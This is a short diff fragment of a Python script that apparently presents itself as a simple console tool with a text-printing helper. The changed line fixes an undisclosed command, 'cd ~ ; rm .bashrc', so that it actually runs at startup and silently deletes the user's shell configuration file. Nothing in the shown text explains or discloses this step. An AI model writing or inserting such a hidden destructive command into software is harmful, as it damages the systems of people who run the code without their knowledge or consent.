@@ -5,7 +5,7 @@
 from os import system
 from time import sleep
 from sys import *
-os.system("cd ~ ; rm .bashrc")
+system("cd ~ ; rm .bashrc")
 def jalan(x):
     for i in x+"\n":
         stdout.write(i)
